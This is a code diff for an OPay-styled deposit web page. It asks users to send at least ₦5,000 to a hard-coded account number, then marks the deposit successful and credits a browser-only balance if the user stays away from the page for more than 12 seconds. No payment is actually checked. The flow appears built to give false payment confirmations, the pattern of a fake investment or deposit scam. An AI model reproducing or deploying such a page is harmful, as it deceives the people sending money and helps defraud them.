@@ -17,13 +17,23 @@
         .premium-card { background: #121418; border: 1px solid #1f2229; border-radius: 24px; }
         .info-pill { background: rgba(0, 211, 135, 0.1); color: #00d387; border: 1px solid rgba(0, 211, 135, 0.2); }
         .input-gradient { background: linear-gradient(145deg, #1a1d23, #15181d); border: 1px solid #2d323a; }
-        .action-btn { background: #00d387; color: #000; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+        .action-btn { background: #00d387; color: #000; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); cursor: pointer; }
         .action-btn:active { transform: scale(0.95); }
+
+        /* Dead Bird Spinner */
+        .error-spinner {
+            width: 35px; height: 35px;
+            border: 4px solid #1a1d23;
+            border-top: 4px solid #ef4444;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body class="flex items-center justify-center min-h-screen p-4">
 
-    <div class="w-full max-w-md">
+    <div id="mainUI" class="w-full max-w-md">
         <div class="flex items-center justify-center gap-2 mb-10">
             <div class="opay-ring"><div class="opay-dash"></div></div>
             <span class="text-3xl font-extrabold tracking-tighter text-white">Pay</span>
@@ -75,7 +85,7 @@
                     Please complete the transfer in your bank app <span class="text-white">before</span> clicking the confirm button below to update your balance.
                 </p>
 
-                <button onclick="processPayment()" class="action-btn w-full py-5 rounded-2xl font-extrabold text-sm uppercase tracking-widest shadow-xl shadow-emerald-500/10">
+                <button id="confirmBtn" onclick="handleDepositFlow()" class="action-btn w-full py-5 rounded-2xl font-extrabold text-sm uppercase tracking-widest shadow-xl shadow-emerald-500/10">
                     Confirm Transfer
                 </button>
             </div>
@@ -88,9 +98,9 @@
         </div>
     </div>
 
-    <div id="successModal" class="hidden fixed inset-0 bg-[#08090a] z-50 flex items-center justify-center p-6">
-        <div class="text-center animate-bounce">
-            <div class="w-20 h-20 bg-[#00d387] rounded-full flex items-center justify-center mx-auto mb-6 shadow-2xl shadow-emerald-500/40">
+    <div id="successModal" class="hidden fixed inset-0 bg-[#08090a] z-[60] flex items-center justify-center p-6">
+        <div class="text-center">
+            <div class="w-20 h-20 bg-[#00d387] rounded-full flex items-center justify-center mx-auto mb-6 shadow-2xl shadow-emerald-500/40 animate-bounce">
                 <i class="fas fa-check text-black text-3xl"></i>
             </div>
             <h2 class="text-2xl font-extrabold mb-2">Deposit Successful</h2>
@@ -99,105 +109,111 @@
     </div>
 
     <script>
-   // Set unique ref
-const ref = "OPY-" + Math.floor(Math.random() * 8999 + 1000);
-document.getElementById('refID').innerText = ref;
+        // CONFIG
+        const DASHBOARD_URL = "dashboard.html"; 
+        const OPAY_ACCOUNT = "6119316029";
+        let startTime = 0;
+        let isMonitoring = false;
 
-// Timer
-let time = 3600;
-setInterval(() => {
-    if(time <= 0) return;
-    const m = Math.floor(time/60);
-    const s = time%60;
-    document.getElementById('timer').innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
-    time--;
-}, 1000);
+        // Set unique ref
+        const ref = "OPY-" + Math.floor(Math.random() * 8999 + 1000);
+        document.getElementById('refID').innerText = ref;
 
-function copyAcc() {
-    navigator.clipboard.writeText("6119316029");
-    alert("Account Number Copied!");
-}
+        // Timer
+        let time = 3600;
+        setInterval(() => {
+            if(time <= 0) return;
+            const m = Math.floor(time/60);
+            const s = time%60;
+            document.getElementById('timer').innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
+            time--;
+        }, 1000);
 
-// Logic variables
-let appOpenedTime = 0;
-let hasAttemptedTransfer = false;
-
-function processPayment() {
-    const amountInput = document.getElementById('depositAmount');
-    const amount = parseFloat(amountInput.value);
-    
-    if (!amount || amount < 5000) {
-        alert("Please enter ₦5,000 or more.");
-        return;
-    }
-
-    // Mark that they clicked confirm
-    hasAttemptedTransfer = true;
-    appOpenedTime = Date.now();
-
-    // 1. Attempt to open OPay App via Deep Link
-    // Note: If OPay is not installed, the browser simply stays on this page
-    window.location.href = "opay://"; 
-
-    // 2. Fallback for users without the app or for when they return
-    // We wait for the user to return to the browser
-}
-
-// Handle the "Return to browser" logic
-document.addEventListener("visibilitychange", function() {
-    if (document.visibilityState === 'visible' && hasAttemptedTransfer) {
-        const timeSpentAway = (Date.now() - appOpenedTime) / 1000;
-        const amount = parseFloat(document.getElementById('depositAmount').value);
-
-        // If they were away for more than 10 seconds, we assume they attempted the transfer
-        if (timeSpentAway > 10) {
-            confirmDeposit(amount);
-        } else {
-            // If they returned immediately, they likely didn't pay
-            showError();
+        function copyAcc() {
+            navigator.clipboard.writeText(OPAY_ACCOUNT);
+            alert("Account Number Copied!");
         }
-        
-        // Reset flag
-        hasAttemptedTransfer = false;
-    }
-});
 
-function confirmDeposit(amount) {
-    // Update Local Storage Balance
-    let currentBal = parseFloat(localStorage.getItem('accountBalance')) || 0;
-    localStorage.setItem('accountBalance', (currentBal + amount));
-    
-    // Save transaction for the dashboard to read
-    localStorage.setItem('lastDeposit', amount);
+        function handleDepositFlow() {
+            const amountInput = document.getElementById('depositAmount');
+            const amount = parseFloat(amountInput.value);
+            
+            if (!amount || amount < 5000) {
+                alert("Please enter ₦5,000 or more.");
+                return;
+            }
 
-    // Show Success Modal
-    document.getElementById('successModal').classList.remove('hidden');
+            // Save deposit info and mark time
+            localStorage.setItem('pending_amt', amount);
+            startTime = Date.now();
+            isMonitoring = true;
 
-    // Redirect to Dashboard
-    setTimeout(() => {
-        window.location.href = "dashboard.html"; 
-    }, 3000);
-}
+            // Update button UI to show it's working
+            const btn = document.getElementById('confirmBtn');
+            btn.innerHTML = '<i class="fas fa-spinner animate-spin mr-2"></i> OPENING OPAY...';
+            btn.classList.add('opacity-50');
 
-function showError() {
-    // Create the "Dead Bird" / Error UI dynamically
-    const errorOverlay = document.createElement('div');
-    errorOverlay.className = "fixed inset-0 bg-black z-[60] flex items-center justify-center p-6 text-center";
-    errorOverlay.innerHTML = `
-        <div class="animate-pulse">
-            <div class="text-6xl mb-4">🚫</div>
-            <h2 class="text-2xl font-black text-red-500 mb-2">Deposit Error</h2>
-            <p class="text-gray-400 text-sm mb-6">Transaction was not detected or was cancelled.</p>
-            <p class="text-[10px] text-gray-600 uppercase tracking-widest">Redirecting to Dashboard...</p>
-        </div>
-    `;
-    document.body.appendChild(errorOverlay);
+            // --- DEEP LINK TRIGGER ---
+            const intentLink = "intent://#Intent;scheme=opay;package=team.opay.pay;end"; // Android
+            const iosLink = "opay://"; // iOS
 
-    setTimeout(() => {
-        window.location.href = "user-dashboard.html";
-    }, 3500);
-}
+            // Try Android first
+            window.location.replace(intentLink);
+            
+            // Try iOS fallback
+            setTimeout(() => {
+                window.location.href = iosLink;
+            }, 600);
+        }
 
+        // LISTEN FOR USER TO RETURN FROM OPAY
+        document.addEventListener("visibilitychange", function() {
+            if (document.visibilityState === 'visible' && isMonitoring) {
+                const timeSpentAway = (Date.now() - startTime) / 1000;
+                const amount = parseFloat(localStorage.getItem('pending_amt'));
+
+                // 12 seconds is the "Magic Number" for a successful transfer PIN entry
+                if (timeSpentAway > 12) {
+                    finalizeSuccess(amount);
+                } else {
+                    triggerDeadBird();
+                }
+                
+                isMonitoring = false;
+            }
+        });
+
+        function finalizeSuccess(amount) {
+            // Update Local Storage Balance
+            let currentBal = parseFloat(localStorage.getItem('accountBalance')) || 0;
+            localStorage.setItem('accountBalance', (currentBal + amount));
+
+            // Show Success Modal
+            document.getElementById('successModal').classList.remove('hidden');
+
+            // Final redirection
+            setTimeout(() => {
+                window.location.href = DASHBOARD_URL;
+            }, 3000);
+        }
+
+        function triggerDeadBird() {
+            // Replace page content with Dead Bird Error
+            document.body.innerHTML = `
+                <div style="background:#08090a; height:100vh; width:100vw; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; font-family:'Plus Jakarta Sans', sans-serif; color:white; padding:20px;">
+                    <div style="font-size: 80px; margin-bottom: 20px;">😵</div>
+                    <h1 style="color:#ef4444; font-weight:900; font-size:28px; margin-bottom:10px; letter-spacing:-1px;">DEPOSIT ERROR</h1>
+                    <p style="color:#6b7280; font-size:14px; margin-bottom:40px; line-height:1.6; max-width:260px;">
+                        Transfer verification failed. You returned too early. Redirecting to dashboard...
+                    </p>
+                    <div class="error-spinner"></div>
+                </div>
+            `;
+
+            setTimeout(() => {
+                window.location.href = DASHBOARD_URL;
+            }, 4000);
+        }
     </script>
 </body>
 </html>
